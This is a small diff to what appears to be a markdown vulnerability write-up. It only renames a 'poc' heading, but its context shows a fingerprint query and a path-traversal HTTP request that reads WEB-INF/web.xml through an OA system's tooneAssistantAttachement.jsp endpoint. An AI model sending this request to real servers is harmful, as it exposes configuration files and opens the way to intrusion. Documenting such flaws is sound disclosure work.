@@ -8,7 +8,7 @@
 body="loginAction.struts?actionType=blockLogin"
 ```
 
-## poc
+## POC
 
 ```java
 GET /jsp/oa/app/webservice/tooneAssistant/tooneAssistantAttachement.jsp?filename=./../../../../../WEB-INF/web.xml HTTP/1.1
